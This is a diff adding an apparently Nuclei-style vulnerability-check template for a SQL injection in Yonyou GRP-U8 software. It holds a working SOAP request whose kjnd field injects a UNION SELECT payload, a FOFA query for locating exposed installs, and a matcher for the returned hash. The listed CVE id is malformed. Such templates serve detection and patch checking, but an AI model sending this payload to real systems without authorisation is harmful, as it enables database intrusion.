@@ -1,0 +1,50 @@
+id: 2024-105091558
+
+info:
+  name: 用友GRP-U8内控管理软件operOriztion存在SQL注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |
+    用友政务公司获知用友GRP-U8行政事业内控管理软件（新政府会计制度专版）存在SQL注入漏洞后，第一时间组织团队进行应急响应，分析处理漏洞问题并发布相关解决补丁，并对相关支持人员进行培训。本次漏洞主要是利用services/operOriztion进行xml SQL注入漏洞，攻击方可利用此漏洞获取数据库敏感信息，造成一定的风险。
+  reference:
+    - https://security.yonyou.com/#/noticeInfo?id=317
+  remediation: |
+    该停服产品存在注入点的接口已于2020年废弃停用并发布更新补丁，请及时更新修复补丁。
+    补丁名称：【20201127-operOriztion服务的sql注入的补丁修复包.rar】
+  classification:
+    cve-id: 2024-105091558
+    cvss-score: 7.6
+    cwe-id: CWE-89
+  metadata:
+    date: 2024-12-29
+    version: |
+      已停服产品GRP-U8-R10受到本次通报漏洞的影响。
+    fofa-query: app="用友-GRP-U8"
+  tags: yonyou,sqli,1day,yonyounc,ncu8
+
+
+http:
+  - raw:
+      - |-
+        POST /services/operOriztion HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: ""
+        Content-Length: 517
+
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+        <kjnd xsi:type="xsd:string">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))-- </kjnd>
+        </wsdd:getGsbmfaByKjnd>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "e10adc3949ba59abbe56e057f20f883e")'
+          - status_code == 200
+        condition: and
